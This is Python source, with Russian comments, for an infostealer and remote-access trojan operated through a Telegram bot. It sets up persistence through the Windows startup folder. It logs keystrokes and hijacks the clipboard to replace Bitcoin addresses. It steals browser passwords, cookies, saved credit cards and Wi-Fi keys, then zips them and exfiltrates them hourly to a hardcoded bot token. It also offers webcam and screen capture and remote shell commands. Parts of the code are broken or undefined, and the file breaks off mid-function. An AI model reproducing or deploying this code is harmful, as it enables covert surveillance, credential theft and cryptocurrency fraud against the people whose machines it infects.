import os
import sys
import platform
import threading
import time
import requests
from datetime import datetime
import re
import pyperclip
from pynput import keyboard
from pynput.mouse import Button, Controller as MouseController
from pynput.keyboard import Controller as KeyboardController
import json
import shutil
import getpass
import locale
import psutil
import uuid
import subprocess
import winreg
from win32com.client import Dispatch
try:
    import wmi
except ImportError:
    wmi = None
try:
    import win32com.client
except ImportError:
    win32com = None
from io import BytesIO
from PIL import ImageGrab, Image
import telegram
from telegram.ext import Updater, CommandHandler
import socket
import cv2
import tempfile
import numpy as np
import pyzipper
import webbrowser
# import yadisk # Больше не используется

# For Windows-specific features
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes

# For text-to-speech
try:
    import pyttsx3
except ImportError:
    pyttsx3 = None

# === НАСТРОЙКИ ===
TELEGRAM_TOKEN = "8194741514:AAG-U_ffc_3rqQvHECBhyHrcuFtEdIEXQhQ"
TELEGRAM_CHAT_ID = "-1002794621184"
ZIP_PASSWORD = "Y1234" # ПАРОЛЬ ДЛЯ АРХИВОВ
# YANDEX_TOKEN больше не нужен

# Папка для хранения данных программы
OUTPUT_DIR = os.path.expanduser('~/PC_Helper_Data')

# === ФУНКЦИЯ ДОБАВЛЕНИЯ В АВТОЗАГРУЗКУ ДЛЯ .EXE ===
def add_to_startup():
    startup_dir = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.executable  # Путь к .exe-файлу
    shortcut_path = os.path.join(startup_dir, "universal_agent.lnk")
    if os.path.exists(shortcut_path):
        return
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()
    except Exception as e:
        try:
            shutil.copy2(exe_path, os.path.join(startup_dir, os.path.basename(exe_path)))
        except Exception:
            pass

# === АВТОЗАПУСК ===
def setup_autostart():
    # Путь к папке автозагрузки текущего пользователя
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_dir, 'btc_clipboard_monitor.lnk')

    # Создадим ярлык (требуется pywin32)
    try:
        import pythoncom
        from win32com.shell import shell, shellcon
        from win32com.client import Dispatch

        shell_link = Dispatch('WScript.Shell').CreateShortcut(shortcut_path)
        shell_link.TargetPath = sys.executable
        shell_link.Arguments = f'"{script_path}"'
        shell_link.WorkingDirectory = os.path.dirname(script_path)
        shell_link.IconLocation = sys.executable
        shell_link.Save()
        print(f'[INFO] Автозапуск настроен — создан ярлык: {shortcut_path}')
    except ImportError:
        print('[ERROR] Для настройки автозапуска на Windows требуется pywin32. Установите через:\n pip install pywin32')
    except Exception as e:
        print(f'[ERROR] Не удалось создать ярлык автозапуска: {e}')

# === КЕЙЛОГГЕР ===
LOG_FILE = os.path.join(OUTPUT_DIR, 'keylogs.txt')
SPECIAL_KEYS = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.tab: '\t',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.shift: '[SHIFT]',
    keyboard.Key.cmd: '[WIN]',
    keyboard.Key.ctrl: '[CTRL]',
    keyboard.Key.alt: '[ALT]',
    keyboard.Key.caps_lock: '[CAPS LOCK]'
}
keylog_lock = threading.Lock()

# === ГЛОБАЛЬНЫЕ ФЛАГИ ===
status_active = True
exit_flag = False
last_clipboard = None
BTC_PATTERN = re.compile(
    r'\b('
    r'1[a-km-zA-HJ-NP-Z1-9]{25,34}|'
    r'3[a-km-zA-HJ-NP-Z1-9]{25,34}|'
    r'bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}'
    r')\b',
    re.IGNORECASE
)

def keylogger_thread():
    def on_press(key):
        global status_active
        if not status_active:
            return
        try:
            ts = datetime.now().strftime('[%Y-%m-%d %H:%M:%S] ')
            if hasattr(key, 'char') and key.char:
                entry = key.char
            elif key in SPECIAL_KEYS:
                entry = SPECIAL_KEYS[key]
            elif hasattr(key, 'name'):
                entry = f"[{key.name.upper()}]"
            else:
                entry = str(key)
            with keylog_lock:
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(ts + entry + '\n')
        except Exception:
            pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:
        time.sleep(60)

def clipboard_monitor_thread():
    global last_clipboard, status_active
    while True:
        try:
            if not status_active:
                time.sleep(1)
                continue
            text = pyperclip.paste()
            if text != last_clipboard:
                matches = BTC_PATTERN.findall(text)
                if matches:
                    new_text = BTC_PATTERN.sub(BTC_ADDRESS, text)
                    pyperclip.copy(new_text)
                    msg = f"🚨 Обнаружен BTC-адрес в буфере!\nЗаменён на: `{BTC_ADDRESS}`\n\nОригинал: {matches}"
                    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
                    requests.post(url, data={
                        'chat_id': TELEGRAM_CHAT_ID,
                        'text': msg,
                        'parse_mode': 'Markdown'
                    })
                last_clipboard = pyperclip.paste()
            time.sleep(1)
        except Exception:
            time.sleep(2)

def get_chromium_base_path(browser_name):
    """Возвращает базовый путь для указанного браузера в зависимости от ОС."""
    config = CHROMIUM_BROWSERS.get(browser_name, {})
    os_name = platform.system().lower()
    path = ""
    if os_name == "windows":
        path = config.get("win")
    elif os_name == "darwin":
        path = config.get("darwin")
    
    return path if path and os.path.exists(path) else None

def get_chromium_profiles(base_path, browser_name):
    """Ищет профили в указанной директории Chromium."""
    if not base_path:
        return []
    
    profiles = []
    # Для Opera и Opera GX пути к данным находятся прямо в корневой папке профиля
    if browser_name in ["Opera", "Opera GX"]:
        if any(os.path.exists(os.path.join(base_path, f)) for f in ["Login Data", "Cookies"]):
            profiles.append(base_path)
        return profiles
        
    # Для остальных Chromium (Chrome, Edge, Yandex) ищем в 'Default' и 'Profile *'
    try:
        for folder in os.listdir(base_path):
            folder_path = os.path.join(base_path, folder)
            if os.path.isdir(folder_path) and (folder == "Default" or folder.startswith("Profile ")):
                if any(os.path.exists(os.path.join(folder_path, f)) for f in ["Login Data", "Cookies", "Web Data"]):
                    profiles.append(folder_path)
    except Exception:
        pass
    return profiles

def get_chromium_encryption_key(base_path):
    """Получает ключ шифрования для Chromium-браузера (только Windows)."""
    if platform.system() != "Windows" or not wmi or not base_path:
        return None
    local_state_path = os.path.join(base_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = wmi.WMI().Win32_Cryptographic_Provider().Invoke()['Key']
        return key
    except Exception:
        return None

def chromium_decrypt_password(ciphertext, key):
    """Универсальная функция расшифровки пароля для Chromium."""
    try:
        if ciphertext[:3] == b'v10':
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode()
        else:
            return wmi.WMI().Win32_Cryptographic_Provider().Invoke()['Key']
    except:
        return ""

def extract_chromium_data(browser_name):
    """Извлекает пароли, куки и автозаполнение для указанного Chromium браузера."""
    base_path = get_chromium_base_path(browser_name)
    if not base_path:
        return {}

    key = get_chromium_encryption_key(base_path)
    profiles = get_chromium_profiles(base_path, browser_name)
    
    data = {'passwords': [], 'cookies': [], 'autofill': []}

    for profile_path in profiles:
        profile_name = os.path.basename(profile_path)
        if profile_name == base_path: profile_name = "Default"

        # --- Passwords ---
        pw_db_path = os.path.join(profile_path, 'Login Data')
        if os.path.exists(pw_db_path):
            tmp_path = copy_db(pw_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, user, encrypted in cursor.fetchall():
                            if user and encrypted:
                                password = chromium_decrypt_password(encrypted, key)
                                data['passwords'].append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n")
                except Exception: pass
                finally: safe_remove(tmp_path)
        
        # --- Cookies ---
        cookies_db_path = os.path.join(profile_path, 'Cookies')
        if os.path.exists(cookies_db_path):
            tmp_path = copy_db(cookies_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name, encrypted in cursor.fetchall():
                            value = chromium_decrypt_password(encrypted, key)
                            if value:
                                data['cookies'].append(f"Profile: {profile_name}\nHost: {host}\nName: {name}\nValue: {value}\n")
                except Exception: pass
                finally: safe_remove(tmp_path)

        # --- Autofill ---
        autofill_db_path = os.path.join(profile_path, 'Web Data')
        if os.path.exists(autofill_db_path):
            tmp_path = copy_db(autofill_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        # 1. Generic Autofill Data
                        try:
                            cursor.execute("SELECT name, value FROM autofill")
                            for name, value in cursor.fetchall():
                                if name and value:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Generic Form\nName: {name}\nValue: {value}\n")
                        except sqlite3.OperationalError:
                            pass # Table might not exist

                        # 2. Addresses
                        try:
                            cursor.execute("SELECT full_name, company_name, street_address, city, state, zipcode, country_code, phone_home_whole_number, email_address FROM autofill_profiles")
                            for full_name, company, addr, city, state, zip_code, country, phone, email in cursor.fetchall():
                                address_parts = [
                                    f"Full Name: {full_name}" if full_name else None,
                                    f"Company: {company}" if company else None,
                                    f"Address: {addr}, {city}, {state} {zip_code}, {country}" if addr else None,
                                    f"Phone: {phone}" if phone else None,
                                    f"Email: {email}" if email else None
                                ]
                                address_str = "\n".join(filter(None, address_parts))
                                if address_str:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Address\n{address_str}\n")
                        except sqlite3.OperationalError:
                            pass # Table or columns might not exist

                        # 3. Credit Cards
                        try:
                            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for name, exp_m, exp_y, encrypted_card in cursor.fetchall():
                                card_number = chromium_decrypt_password(encrypted_card, key)
                                if card_number:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Credit Card\nName on Card: {name}\nExpires: {exp_m}/{exp_y}\nNumber: {card_number}\n")
                        except sqlite3.OperationalError:
                            pass # Table might not exist

                except Exception:
                    # Catch other potential errors during connection or file handling
                    pass
                finally:
                    safe_remove(tmp_path)
                
    return data

def copy_db(db_path):
    """Копирует базу данных во временный файл, чтобы обойти блокировку."""
    try:
        fd, tmp_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception:
        return None

def safe_remove(path):
    """Безопасно удаляет временный файл."""
    if not path: return
    for _ in range(5):
        try:
            os.remove(path)
            return
        except PermissionError:
            time.sleep(0.1)
        except Exception:
            return

def get_firefox_profiles():
    """Находит пути к профилям Firefox."""
    profiles = []
    ff_path_base = ""
    if platform.system() == 'Windows':
        ff_path_base = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox')
    elif platform.system() == 'Darwin':
        ff_path_base = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox')
    else: # Linux
        ff_path_base = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')

    profiles_ini = os.path.join(ff_path_base, 'profiles.ini')
    if not os.path.exists(profiles_ini):
        return []

    try:
        with open(profiles_ini, 'r', encoding='utf-8') as f:
            current_path = None
            is_relative = False
            for line in f:
                line = line.strip()
                if line.lower().startswith('[profile'):
                    # Сбрасываем значения для нового профиля
                    if current_path is not None:
                        path_to_add = os.path.join(ff_path_base, current_path.replace('/', os.sep)) if is_relative else current_path.replace('/', os.sep)
                        if os.path.exists(path_to_add):
                            profiles.append(path_to_add)
                    current_path = None
                    is_relative = False
                elif line.lower().startswith('path='):
                    current_path = line[5:]
                elif line.lower().startswith('isrelative='):
                    is_relative = line[11:].strip() == '1'
            # Добавляем последний профиль в файле
            if current_path is not None:
                path_to_add = os.path.join(ff_path_base, current_path.replace('/', os.sep)) if is_relative else current_path.replace('/', os.sep)
                if os.path.exists(path_to_add):
                    profiles.append(path_to_add)
    except Exception:
        pass # Игнорируем ошибки парсинга

    return list(set(profiles)) # Возвращаем уникальные пути

def run_firefox_decrypt(profile_path):
    """Запускает firefox_decrypt для указанного профиля и возвращает результат."""
    script_path = os.path.join(FIREFOX_DECRYPT_PATH, 'firefox_decrypt.py')
    if not os.path.exists(script_path):
        return f"Скрипт firefox_decrypt.py не найден в {FIREFOX_DECRYPT_PATH}"

    # Используем тот же python.exe, которым запущен основной скрипт
    python_executable = sys.executable
    
    try:
        # Запускаем firefox_decrypt как подпроцесс
        result = subprocess.run(
            [python_executable, script_path, profile_path],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            check=True,
            timeout=30 # Таймаут на всякий случай
        )
        return result.stdout
    except FileNotFoundError:
        return f"Ошибка: не найден '{python_executable}'. Убедитесь, что Python в PATH."
    except subprocess.CalledProcessError as e:
        return f"Ошибка при выполнении firefox_decrypt для '{profile_path}':\n{e.stderr}"
    except subprocess.TimeoutExpired:
        return f"Таймаут при выполнении firefox_decrypt для '{profile_path}'."
    except Exception as e:
        return f"Неизвестная ошибка при запуске firefox_decrypt для '{profile_path}': {e}"

def extract_firefox_passwords():
    """Извлекает пароли Firefox с помощью firefox_decrypt."""
    if not ensure_firefox_decrypt():
        return ["Зависимость firefox_decrypt не установлена. Извлечение паролей Firefox невозможно."]
    profiles = get_firefox_profiles()
    results = []
    for profile in profiles:
        profile_name = os.path.basename(profile)
        decrypted_data = run_firefox_decrypt(profile)
        results.append(f"=== Firefox Profile: {profile_name} ===\n{decrypted_data}\n\n")
    return results

def screenshot_thread():
    while True:
        time.sleep(10)

def webcam_thread():
    while True:
        time.sleep(10)

def generate_and_send_archive(is_manual_request=False, chat_id=TELEGRAM_CHAT_ID):
    """Собирает данные, архивирует, отправляет в Telegram и очищает временные файлы."""
    now = datetime.now().strftime('%Y%m%d_%H%M%S')
    new_files = []
    
    try:
        # --- Сбор данных и создание временных файлов ---
        for browser_name in CHROMIUM_BROWSERS.keys():
            browser_data = extract_chromium_data(browser_name)
            if browser_data.get('passwords'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_passwords_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Passwords ---\n\n")
                    f.writelines(browser_data['passwords'])
                new_files.append(file_path)
            if browser_data.get('cookies'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_cookies_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Cookies ---\n\n")
                    f.writelines(browser_data['cookies'])
                new_files.append(file_path)
            if browser_data.get('autofill'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_autofill_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Autofill ---\n\n")
                    f.writelines(browser_data['autofill'])
                new_files.append(file_path)

        firefox_pw = extract_firefox_passwords()
        if firefox_pw:
            file_path = os.path.join(OUTPUT_DIR, f'firefox_passwords_{now}.txt')
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(firefox_pw)
            new_files.append(file_path)

        files_to_zip = new_files[:]
        if os.path.exists(LOG_FILE):
            files_to_zip.append(LOG_FILE)

        if not files_to_zip:
            # Отправляем сообщение, если нечего архивировать при ручном запросе
            if is_manual_request:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    data={'chat_id': chat_id, 'text': "Нечего архивировать. Все данные уже отправлены."}
                )
            return

        # --- Архивирование ---
        archive_name = f"agent_data_{now}.zip"
        archive_path = os.path.join(OUTPUT_DIR, archive_name)
        with pyzipper.AESZipFile(archive_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(ZIP_PASSWORD.encode('utf-8'))
            for file_path in files_to_zip:
                if os.path.exists(file_path):
                    zipf.write(file_path, arcname=os.path.basename(file_path))

        # --- Отправка архива в Telegram ---
        caption = "Архив по запросу" if is_manual_request else "Автоархив"
        caption += f". Пароль: `{ZIP_PASSWORD}`"
        
        # Проверка размера файла (лимит Telegram ~50MB)
        if os.path.getsize(archive_path) > 50 * 1024 * 1024:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={'chat_id': chat_id, 'text': f"Ошибка: Архив '{archive_name}' слишком большой (>50МБ) для отправки."}
            )
            return

        with open(archive_path, 'rb') as archive_file:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                files={'document': archive_file},
                data={'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            )

    except Exception as e:
        if is_manual_request:
            # Если ошибка при ручном запросе, сообщаем пользователю
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={'chat_id': chat_id, 'text': f"Ошибка при создании или отправке архива: {e}"}
            )
    finally:
        # --- Очистка ---
        for file_path in new_files:
            safe_remove(file_path)
        if 'archive_path' in locals() and os.path.exists(archive_path):
            safe_remove(archive_path)

def archive_and_send_thread():
    while True:
        generate_and_send_archive(is_manual_request=False)
        time.sleep(60 * 60) # 1 час

def take_screenshot():
    try:
        img = ImageGrab.grab()
        bio = BytesIO()
        img.save(bio, format="PNG")
        bio.seek(0)
        return bio
    except Exception as e:
        return None

def get_system_info():
    info = {
        "🖥️ Name": socket.gethostname(),
        "💻 OS": f"{platform.system()} {platform.release()}"
    }
    try:
        info["🌐 IP"] = requests.get("https://api.ipify.org", timeout=5).text
    except:
        info["🌐 IP"] = "N/A"
    return info

def capture_webcam(duration=None):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        if duration is None:
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return None
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame)
            bio = BytesIO()
            img.save(bio, format="JPEG")
            bio.seek(0)
            return bio
        else:
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.mp4')
            os.close(tmp_fd)
            fps = 20.0
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            out = cv2.VideoWriter(tmp_path, fourcc, fps, (width, height))
            start = time.time()
            while time.time() - start < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
            cap.release()
            out.release()
            return tmp_path
    except Exception:
        return None

def get_full_status_info():
    info = {}
    # === ОСНОВНОЕ ===
    try:
        info['Имя устройства'] = socket.gethostname()
    except Exception as e:
        info['Имя устройства'] = f'Ошибка: {e}'
    try:
        info['Имя пользователя'] = os.getlogin()
    except Exception:
        try:
            info['Имя пользователя'] = getpass.getuser()
        except Exception as e:
            info['Имя пользователя'] = f'Ошибка: {e}'
    try:
        info['ОС'] = f"{platform.system()} {platform.release()} ({platform.version()})"
        info['Разрядность'] = platform.architecture()[0]
    except Exception as e:
        info['ОС'] = f'Ошибка: {e}'
    try:
        info['Язык системы'] = locale.getdefaultlocale()[0]
    except Exception as e:
        info['Язык системы'] = f'Ошибка: {e}'
    try:
        uptime_sec = time.time() - psutil.boot_time()
        uptime_str = time.strftime('%H:%M:%S', time.gmtime(uptime_sec))
        info['Uptime'] = uptime_str
    except Exception as e:
        info['Uptime'] = f'Ошибка: {e}'
    try:
        info['Архитектура'] = platform.architecture()[0]
    except Exception as e:
        info['Архитектура'] = f'Ошибка: {e}'
    # === Оборудование ===
    try:
        info['CPU'] = f"{platform.processor()} ({psutil.cpu_count(logical=False)} ядер / {psutil.cpu_count()} потоков)"
    except Exception as e:
        info['CPU'] = f'Ошибка: {e}'
    try:
        ram = psutil.virtual_memory()
        info['RAM'] = f"{round(ram.total / (1024**3), 2)} ГБ"
    except Exception as e:
        info['RAM'] = f'Ошибка: {e}'
    # GPU (ограниченно)
    gpu_info = 'N/A'
    if platform.system() == 'Windows':
        try:
            if wmi:
                c = wmi.WMI()
                gpus = c.Win32_VideoController()
                gpu_info = ", ".join([gpu.Name for gpu in gpus])
            else:
                out = subprocess.check_output('wmic path win32_VideoController get name', shell=True, encoding='cp866')
                lines = [l.strip() for l in out.split('\n') if l.strip() and 'Name' not in l]
                gpu_info = ', '.join(lines)
        except Exception as e:
            gpu_info = f'Ошибка: {e}'
    info['GPU'] = gpu_info
    # BIOS (частично)
    bios_info = 'N/A'
    if platform.system() == 'Windows' and wmi:
        try:
            c = wmi.WMI()
            bios = c.Win32_BIOS()[0]
            bios_info = f"{bios.Manufacturer} {bios.SMBIOSBIOSVersion} {bios.ReleaseDate}"
        except Exception as e:
            bios_info = f'Ошибка: {e}'
    info['BIOS'] = bios_info
    # === Диски ===
    try:
        disks = psutil.disk_partitions()
        disk_list = []
        for d in disks:
            try:
                usage = psutil.disk_usage(d.mountpoint)
                disk_list.append(f"{d.device} ({d.fstype}): {round(usage.total/(1024**3),1)}ГБ всего, {round(usage.free/(1024**3),1)}ГБ свободно")
            except Exception:
                disk_list.append(f"{d.device} ({d.fstype}): ошибка доступа")
        info['Диски'] = '\n'.join(disk_list)
    except Exception as e:
        info['Диски'] = f'Ошибка: {e}'
    # Тип дисков (HDD/SSD)
    disk_types = []
    if platform.system() == 'Windows':
        try:
            out = os.popen('wmic diskdrive get model,mediatype').read()
            for line in out.split('\n'):
                if line.strip() and 'Model' not in line:
                    disk_types.append(line.strip())
            info['Типы дисков'] = '\n'.join(disk_types)
        except Exception as e:
            info['Типы дисков'] = f'Ошибка: {e}'
    # === Сеть ===
    try:
        info['Локальный IP'] = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        info['Локальный IP'] = f'Ошибка: {e}'
    try:
        info['MAC-адрес'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    except Exception as e:
        info['MAC-адрес'] = f'Ошибка: {e}'
    # Сетевые адаптеры
    try:
        adapters = psutil.net_if_addrs()
        info['Сетевые адаптеры'] = ', '.join(adapters.keys())
    except Exception as e:
        info['Сетевые адаптеры'] = f'Ошибка: {e}'
    # Активные соединения
    try:
        conns = psutil.net_connections()
        info['Активные соединения'] = str(len(conns))
    except Exception as e:
        info['Активные соединения'] = f'Ошибка: {e}'
    # Wi-Fi SSID (Windows)
    if platform.system() == 'Windows':
        try:
            out = subprocess.check_output('netsh wlan show interfaces', shell=True, encoding='cp866')
            ssid = None
            for line in out.split('\n'):
                if 'SSID' in line and 'BSSID' not in line:
                    ssid = line.split(':',1)[-1].strip()
                    break
            info['Wi-Fi SSID'] = ssid or 'N/A'
        except Exception as e:
            info['Wi-Fi SSID'] = f'Ошибка: {e}'
    return info

# === NEW REMOTE CONTROL FUNCTIONS ===

def system_shutdown():
    if platform.system() == "Windows":
        os.system("shutdown /s /t 1")
    else: # For Linux/macOS
        os.system("shutdown now")

def system_restart():
    if platform.system() == "Windows":
        os.system("shutdown /r /t 1")
    else:
        os.system("reboot")

def system_logout():
    if platform.system() == "Windows":
        os.system("shutdown /l")
        return None
    else:
        # This is more complex on Linux, depends on desktop environment
        return "Выход из системы поддерживается только в Windows."

def open_url_in_browser(url):
    webbrowser.open(url)

def execute_shell_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120,
            encoding='cp866', # Common for Russian Windows console
            errors='ignore'
        )
        output = result.stdout + result.stderr
        return output if output else "Command executed with no output."
    except Exception as e:
        return f"Error executing command: {e}"

def run_hidden_process(path):
    try:
        if platform.system() == "Windows":
            # Запускаем процесс без создания нового окна
            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # На Linux/macOS, '&' запускает в фоне
            subprocess.Popen(f"{path} &", shell=True)
        return "Процесс запущен в фоновом режиме."
    except Exception as e:
        return f"Не удалось запустить процесс: {e}"

def move_mouse(x, y):
    try:
        mouse = MouseController()
        mouse.position = (int(x), int(y))
        return f"Mouse moved to ({x}, {y})."
    except Exception as e:
        return f"Error moving mouse: {e}"

def click_mouse():
    try:
        mouse = MouseController()
        mouse.click(Button.left, 1)
        return "Mouse clicked."
    except Exception as e:
        return f"Error clicking mouse: {e}"

def type_with_keyboard(text):
    try:
        keyboard = KeyboardController()
        keyboard.type(text)
        return f"Typed text: {text}"
    except Exception as e:
        return f"Error typing: {e}"

def lock_workstation():
    if platform.system() == "Windows":
        ctypes.windll.user32.LockWorkStation()
        return "Экран заблокирован."
    return "Блокировка экрана поддерживается только в Windows."

def text_to_speech_speak(text):
    if not pyttsx3:
        return "pyttsx3 library not installed. Cannot speak."
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        return "Text spoken."
    except Exception as e:
        return f"Error in text-to-speech: {e}"

def show_popup_message(text, title="Message"):
    if platform.system() == "Windows":
        ctypes.windll.user32.MessageBoxW(0, text, title, 0)
        return "Popup message shown."
    return "Popups are only supported on Windows."

def set_desktop_wallpaper(path):
    if platform.system() == "Windows":
        if not os.path.exists(path):
            return "Файл изображения не найден."
        # SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "Обои рабочего стола изменены."
    return "Установка обоев поддерживается только в Windows."

def get_wifi_passwords_list():
    if platform.system() != "Windows":
        return "Wi-Fi password extraction only works on Windows."
    
    try:
        profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True, encoding='cp866', errors='ignore')
        profile_names_raw = re.findall(r"(?:Все профили пользователей|User profiles on interface.*?)\s*:\s*(.*)", profiles_data)
        
        if not profile_names_raw:
            return "No Wi-Fi profiles found."
        
        profile_names = profile_names_raw[0].split('\n')
        
        wifi_list = []
        for name_line in profile_names:
            name = name_line.strip()
            if not name: continue
            try:
                profile_info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True, encoding='cp866', errors='ignore')
                password = re.search(r"(?:Содержимое ключа|Key Content)\s*:\s*(.*)", profile_info)
                if password:
                    wifi_list.append(f"SSID: {name}\nPassword: {password.group(1).strip()}\n")
            except Exception:
                wifi_list.append(f"SSID: {name}\nPassword: (не удалось получить)\n")
                
        return "\n".join(wifi_list) if wifi_list else "Не найдено ни одного профиля Wi-Fi."
    except Exception as e:
        return f"Ошибка при получении паролей Wi-Fi: {e}"

def list_files_in_directory(path):
    if not os.path.isdir(path):
        return f"Error: Directory not found at '{path}'"
    try:
        items = os.listdir(path)
        if not items:
            return f"Directory is empty: '{path}'"
        
        files = []
        dirs = []
        for item in items:
            full_path = os.path.join(path, item)
            try:
                if os.path.isdir(full_path):
                    dirs.append(f"📁 {item}")
                else:
                    files.append(f"📄 {item}")
            except OSError:
                files.append(f"❓ {item} (access error)")

        
        output = ""
        if dirs:
            output += "Folders:\n" + "\n".join(sorted(dirs))
        if files:
            output += "\n\nFiles:\n" + "\n".join(sorted(files))

        return output
        
    except Exception as e:
        return f"Error listing directory '{path}': {e}"


# === TELEGRAM БОТ ===
def telegram_bot_thread():
    global status_active
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher

    def cmd_screen(update, context):
        ss = take_screenshot()
        if ss:
            context.bot.send_photo(chat_id=update.effective_chat.id, photo=ss)
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="Не удалось сделать скриншот")

    def cmd_status(update, context):
        info = get_full_status_info()
        text = (
            '🖥️ <b>СИСТЕМА</b>\n'
            f'  💻 <b>Имя устройства:</b> {info.get("Имя устройства", "N/A")}\n'
            f'  👤 <b>Имя пользователя:</b> {info.get("Имя пользователя", "N/A")}\n'
            f'  🏷️ <b>ОС:</b> {info.get("ОС", "N/A")}\n'
            f'  🏹 <b>Разрядность:</b> {info.get("Разрядность", "N/A")}\n'
            f'  🌐 <b>Язык системы:</b> {info.get("Язык системы", "N/A")}\n'
            f'  ⏱️ <b>Uptime:</b> {info.get("Uptime", "N/A")}\n'
            f'  🏗️ <b>Архитектура:</b> {info.get("Архитектура", "N/A")}\n'
            '\n'
            '🧠 <b>ОБОРУДОВАНИЕ</b>\n'
            f'  🖲️ <b>CPU:</b> {info.get("CPU", "N/A")}\n'
            f'  🧬 <b>RAM:</b> {info.get("RAM", "N/A")}\n'
            f'  🎮 <b>GPU:</b> {info.get("GPU", "N/A")}\n'
            f'  🏷️ <b>BIOS:</b> {info.get("BIOS", "N/A")}\n'
            '\n'
            '💾 <b>ДИСКИ</b>\n'
            f'  💽 <b>Диски:</b>\n    {info.get("Диски", "N/A").replace(chr(10), chr(10)+"    ")}\n'
            f'  🗃️ <b>Типы дисков:</b>\n    {info.get("Типы дисков", "N/A").replace(chr(10), chr(10)+"    ")}\n'
            '\n'
            '🌐 <b>СЕТЬ</b>\n'
            f'  🏠 <b>Локальный IP:</b> {info.get("Локальный IP", "N/A")}\n'
            f'  🆔 <b>MAC-адрес:</b> {info.get("MAC-адрес", "N/A")}\n'
            f'  🌉 <b>Сетевые адаптеры:</b> {info.get("Сетевые адаптеры", "N/A")}\n'
            f'  🔗 <b>Активные соединения:</b> {info.get("Активные соединения", "N/A")}\n'
            f'  🌐 <b>Wi-Fi SSID:</b> {info.get("Wi-Fi SSID", "N/A")}\n'
        )
